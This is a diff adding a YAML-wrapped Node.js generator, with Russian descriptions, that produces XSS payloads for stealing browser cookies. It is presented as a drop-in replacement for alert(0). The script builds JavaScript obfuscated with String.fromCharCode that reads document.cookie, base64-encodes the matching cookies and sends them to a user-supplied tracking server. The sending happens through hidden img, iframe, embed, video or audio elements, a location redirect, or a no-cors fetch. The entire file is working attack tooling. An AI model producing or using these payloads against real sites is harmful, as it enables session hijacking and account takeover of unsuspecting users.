@@ -1,0 +1,116 @@
+description: >-
+  Генератор нагрузки для похищения печенья. Внедрять вместо alert(0).
+author: vinzekatze
+tags:
+  - xss
+  - payload
+  - generator
+  - cookie
+
+arguments:
+  url:
+    default:
+    description: >-
+      URL отслеживающего сервера (например: 'http://pentester.site')
+  a:
+    default:
+      - img
+      - iframe
+      - embed
+      - video
+      - audio
+      - location
+      - fetch
+    description: агент с помощью которого будет осуществляться запрос на отслеживающий сервер
+    replacer: '#agent#'
+  c:
+    default: '.*'
+    description: указать имена конкретных cookie для похищения
+    multiple: true
+    metavar: COOKIE
+  param:
+    default: payload
+    description: GET-параметр, в котором будет отправляться похищенное в кодировке base64
+    metavar: PARAMETER
+  head:
+    default: 
+      - body
+      - head
+    description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
+    replacer: '#pos#'
+
+
+mode:
+  format:
+    url: '{0!r}'
+    param: '{0!r}'
+    head: '{0!r}'
+  join:
+    c: '|'
+  pformat:
+    c: '{0!r}'
+
+  replace:
+    a:
+      img: |-
+        var attackElementStart = `<img src="${serverURL}?${serverParam}=`;
+        var attackElementEnd = `" style="display:none">`;
+        var payloadTemplate = "document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))"
+      iframe: |-
+        var attackElementStart = `<iframe src="${serverURL}?${serverParam}=`;
+        var attackElementEnd = `" style="display:none"></iframe>`;
+        var payloadTemplate = "document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))"
+      embed: |-
+        var attackElementStart = `<embed src="${serverURL}?${serverParam}=`;
+        var attackElementEnd = `" style="display:none">`;
+        var payloadTemplate = "document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))"
+      video: |-
+        var attackElementStart = `<video src="${serverURL}?${serverParam}=`;
+        var attackElementEnd = `"controls style="display:none"></video>`;
+        var payloadTemplate = "document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))"
+      audio: |-
+        var attackElementStart = `<audio src="${serverURL}?${serverParam}=`;
+        var attackElementEnd = `"controls style="display:none"></audio>`;
+        var payloadTemplate = "document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))"
+      location: |
+        var attackElementStart = `${serverURL}?${serverParam}=`;
+        var attackElementEnd = "";
+        var payloadTemplate = "window.location.replace(String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch}))"
+      fetch: |
+        var attackElementStart = `${serverURL}`;
+        var attackElementEnd = "";
+        var payloadTemplate = "fetch(String.fromCharCode(${chars_attackElementStart}),JSON.parse(String.fromCharCode(123,34,109,101,116,104,111,100,34,58,34,80,79,83,84,34,44,34,109,111,100,101,34,58,34,110,111,45,99,111,114,115,34,44,34,98,111,100,121,34,58,34).concat(${cookiesnatch},String.fromCharCode(34,125))))"
+shell: node
+script: |
+  function MakeCharCode(pld) {
+    output_arr = [];
+    pld_arr = [...pld];
+    pld_arr.forEach((i) => {
+      output_arr.push(i.charCodeAt(0));
+    });
+    output = output_arr.join(",");
+    return output;
+  };
+  
+  var serverURL = #url#;
+  var serverParam = #param#;
+  var input_cookieRegex = #c#;
+  var position = #pos#;
+
+  var cookieRegex = `(${input_cookieRegex})=[^;]+`;
+
+  // внедряемый элемент
+  #agent#
+
+  // Сборка нагрузки для получения куков
+  chars_cookieRegex = MakeCharCode(cookieRegex);
+  cookiesnatch = `btoa(document.cookie.match(RegExp(String.fromCharCode(${chars_cookieRegex}),String.fromCharCode(103))).join(String.fromCharCode(59,32)))`;
+
+  // Сборка полной нагрузки
+  chars_attackElementStart = MakeCharCode(attackElementStart);
+  chars_attackElementEnd = MakeCharCode(attackElementEnd);
+  chars_position = MakeCharCode("beforeend")
+  //payload = `document.${position}.insertAdjacentHTML(String.fromCharCode(${chars_position}),String.fromCharCode(${chars_attackElementStart}).concat(${cookiesnatch},String.fromCharCode(${chars_attackElementEnd})))`;
+  payload = eval(`\`${payloadTemplate}\``);
+
+  console.log(payload);
